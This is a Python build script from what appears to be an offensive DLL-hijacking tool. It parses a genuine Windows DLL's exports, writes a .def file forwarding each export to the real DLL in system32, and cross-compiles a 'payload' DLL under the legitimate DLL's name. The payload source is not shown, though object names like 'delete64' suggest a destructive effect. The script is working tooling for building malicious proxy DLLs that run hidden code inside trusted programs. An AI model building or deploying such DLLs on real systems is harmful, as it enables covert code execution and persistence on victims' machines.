#!/usr/bin/env python3

#Most of this script taken from: https://github.com/tothi/dll-hijack-by-proxying/blob/master/gen_def.py

import os
import sys
import pefile

def Help():
    print("Invalid usage!\nUsage: python3 generate_dll.py <path/to/real/DLL> <x86|x64>")
    sys.exit()

if len(sys.argv) != 3 or ".dll" not in sys.argv[1] or (sys.argv[2] != "x64" and sys.argv[2] != "x86"):
    Help()

#Get cwd
cwd = os.getcwd()

#Grab DLL sys.argv1
dll = pefile.PE(sys.argv[1])

#Get DLL name from supplied path 
dll_name = (sys.argv[1]).split("/")[-1];

#Strip .dll from the name e.g. cscapi.dll -> cscapi
dll_basename = os.path.splitext(dll_name)[0]

#Create .def file name
deffile_name = dll_basename + ".def"

#Create .def file for writing
deffile = open("src/DLL_Payload/exports.def", "w")
deffile.write("EXPORTS\n")

#Walk legitimate DLL and create list of all exports so we can forward any calls to functions to the real DLL
#Note that the C:/windows/system32/ part could be removed, which would result in the DLL search order being followed;
#Had issues with this however that were resolved by pointing at the DLL's via absolute path
#Most DLL's will be found in system32, but if one needed to be found elsewhere would have to alter the script.
#This also doesn't account for hijacking an x86 DLL on a x64 system in which case syswow64 would be needed...
#Room for further research and work here.
for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        deffile.write('{}=C:/windows/system32/{}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))
deffile.close()

#Generate x64 DLL
if sys.argv[2] == "x64":
    result = os.system('x86_64-w64-mingw32-gcc -c -o src/DLL_Payload/delete64.o src/DLL_Payload/entry.c')
    if result == 0:
        result = os.system('x86_64-w64-mingw32-windres src/DLL_Payload/resource.rc src/DLL_Payload/delete64.o')
        if result == 0:
            os.system('x86_64-w64-mingw32-dllwrap --def src/DLL_Payload/exports.def src/DLL_Payload/delete64.o -o dist/{} src/DLL_Payload/entry.c -s -Os -lshlwapi'.format(dll_name))
            if result == 0:
                print("Payload created at: " + cwd + "/dist/" + dll_name)

#Generate x86 DLL	
elif sys.argv[2] == "x86":
    result = os.system('i686-w64-mingw32-gcc -c -o src/DLL_Payload/delete32.o src/DLL_Payload/entry.c')
    if result == 0:
        result = os.system('i686-w64-mingw32-windres src/DLL_Payload/resource.rc src/DLL_Payload/delete32.o')
        if result == 0:
            result = os.system('i686-w64-mingw32-dllwrap --def src/DLL_Payload/exports.def src/DLL_Payload/delete32.o -o dist/{} src/DLL_Payload/entry.c -s -Os -lshlwapi'.format(dll_name))
            if result == 0:
                print("Payload created at: " + cwd + "/dist/" + dll_name)
                    
#Print help menu and exit
else:
    Help()